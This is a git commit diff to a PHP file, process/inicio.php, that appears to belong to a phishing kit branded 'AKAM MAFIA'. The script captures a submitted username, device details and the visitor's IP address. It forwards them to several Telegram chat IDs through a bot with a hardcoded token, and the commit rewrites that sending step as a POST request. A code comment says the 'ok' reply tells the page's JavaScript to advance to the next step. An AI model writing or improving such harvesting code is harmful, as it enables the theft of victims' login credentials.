ec1459ce2247210741166382983c8584bcf50a5c
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-22 01:22:20 -0500

    Actualizar inicio.php

--- process/inicio.php
+++ process/inicio.php
@@ -5,15 +5,32 @@ $d = $_POST['dis'];
 $ip = $_SERVER['REMOTE_ADDR'];
 
 $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-$ids = ["8114050673", "8518977918", "8638340940"];
+$ids = ["8114050673", "8518977918", "8638340940"]; 
 
 if(!empty($u)){
-    $msg = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n👤 <b>USUARIO:</b> <code>$u</code>\n📱 <b>SISTEMA:</b> $d\n📍 <b>IP:</b> $ip";
+    $msg = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n";
+    $msg .= "👤 <b>USUARIO:</b> <code>$u</code>\n";
+    $msg .= "📱 <b>SISTEMA:</b> $d\n";
+    $msg .= "📍 <b>IP:</b> $ip";
+
     foreach($ids as $id){
-        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=".urlencode($msg)."&parse_mode=HTML";
-        $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch); curl_close($ch);
+        $url = "https://api.telegram.org/bot$token/sendMessage";
+        $data = [
+            'chat_id' => $id,
+            'text' => $msg,
+            'parse_mode' => 'HTML'
+        ];
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_exec($ch);
+        curl_close($ch);
     }
+    // ESTO ES VITAL para que el JS sepa que ya puede saltar
     echo "ok";
 }
 ?>
